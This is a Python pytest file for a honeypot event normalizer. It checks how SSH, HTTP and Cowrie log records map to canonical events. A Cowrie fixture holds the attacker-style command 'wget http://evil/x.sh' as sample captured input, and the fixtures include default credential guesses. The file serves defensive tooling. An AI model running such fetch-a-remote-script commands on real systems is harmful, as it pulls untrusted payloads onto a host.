"""Tests for the event normalizer."""

from __future__ import annotations

import pytest

from canary.core.errors import NormalizationError
from canary.ingest.normalizer import normalize_raw


class TestNormalizeCanonical:
    def test_auth_ssh_event(self) -> None:
        raw = {
            "honeypot": "voltron-ssh",
            "event_type": "auth",
            "protocol": "ssh",
            "src_ip": "203.0.113.7",
            "src_port": 51234,
            "dst_port": 22,
            "username": "root",
            "password": "admin123",
        }
        event = normalize_raw(raw)
        assert event.honeypot == "voltron-ssh"
        assert event.event_type == "auth"
        assert event.src_ip == "203.0.113.7"
        assert event.username == "root"
        assert event.timestamp is not None

    def test_unknown_event_type_with_password_becomes_auth(self) -> None:
        event = normalize_raw(
            {
                "honeypot": "blood-web",
                "event_type": "generic",
                "src_ip": "198.51.100.1",
                "password": "pass123",
            }
        )
        assert event.event_type == "auth"

    def test_http_event_fields(self) -> None:
        event = normalize_raw(
            {
                "honeypot": "blood-web",
                "event_type": "http",
                "protocol": "http",
                "src_ip": "198.51.100.2",
                "method": "get",
                "url": "/admin",
                "response_code": 200,
            }
        )
        assert event.method == "GET"
        assert event.url == "/admin"
        assert event.response_code == 200

    def test_missing_honeypot_raises(self) -> None:
        with pytest.raises(NormalizationError):
            normalize_raw({"src_ip": "1.2.3.4"})


class TestNormalizeCowrie:
    def _cowrie(self, **kw) -> dict:
        base = {
            "eventid": "cowrie.command.input",
            "src_ip": "192.0.2.9",
            "src_port": 47123,
            "session": "abc123",
            "message": "wget http://evil/x.sh",
            "timestamp": "2026-09-07T00:00:00Z",
        }
        base.update(kw)
        return base

    def test_detected_by_eventid(self) -> None:
        event = normalize_raw(self._cowrie())
        assert event.honeypot == "cowrie"
        assert event.event_type == "command"
        assert event.src_ip == "192.0.2.9"
        assert event.command == "wget http://evil/x.sh"
        assert event.session_id == "abc123"

    def test_login_maps_to_auth(self) -> None:
        event = normalize_raw(
            self._cowrie(
                eventid="cowrie.login.failed",
                username="root",
                password="toor",
            )
        )
        assert event.event_type == "auth"
        assert event.username == "root"
        assert event.password == "toor"

    def test_legacy_type_field(self) -> None:
        event = normalize_raw(
            {
                "type": "command",
                "message": "ls -la",
                "session": "s1",
                "src_ip": "10.0.0.1",
            }
        )
        assert event.honeypot == "cowrie"
        assert event.event_type == "command"

    def test_invalid_json_survives_as_raw(self) -> None:
        event = normalize_raw(
            {
                "eventid": "cowrie.command.input",
                "src_ip": "192.0.2.9",
                "session": "s",
                "message": "ls",
            }
        )
        assert event.raw is not None
        assert "cowrie" in event.raw
